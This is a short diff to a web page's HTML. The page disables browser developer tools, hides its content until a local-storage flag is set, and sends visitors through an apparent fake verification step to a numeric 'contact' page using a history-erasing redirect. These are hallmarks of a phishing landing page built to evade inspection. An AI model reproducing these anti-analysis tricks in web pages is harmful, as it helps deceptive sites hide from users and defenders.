@@ -13,9 +13,9 @@
 </head>
 
 <body><noscript>You need to enable JavaScript to run this app.</noscript>
-  <img hidden src="./img/333.png"/>
-  <img hidden src="./img/block_2.png"/>
-  <div id="root">
+  <img hidden src="./img/333.png" />
+  <img hidden src="./img/block_2.png" />
+  <div id="root" style="display: none;">
     <div class="flex flex-col items-center justify-start bg-[#ffffff] h-screen w-full">
       <div class="font-roboto text-[14px] text-gray-800 w-full p-4 md:p-0 md:w-[300px]">
         <div class="text-start text-xs text-gray-500 mt-20 md:mt-[150px]"><img
@@ -62,7 +62,9 @@
     DisableDevtool();
     storedValue = localStorage.getItem('ipc');
     if (storedValue == "true") {
-      window.location.href = "contact/1552997831589494.html";
+      window.location.replace("contact/531795380173090");
+    } else {
+      document.getElementById("root").style.display = 'block';
     }
 
     var ipc = document.getElementById("ipc");
@@ -81,13 +83,15 @@
         sIpc1.style.display = 'block';
 
         setTimeout(() => {
-          window.location.href = "contact/1552997831589494";
+          window.location.replace("contact/531795380173090");
+
+          // window.location.href = "531795380173090/contact/1552997831589494";
         }, 1500);
 
         localStorage.setItem("ipc", "true");
       }
     });
-    
+
   </script>
 
 </body>
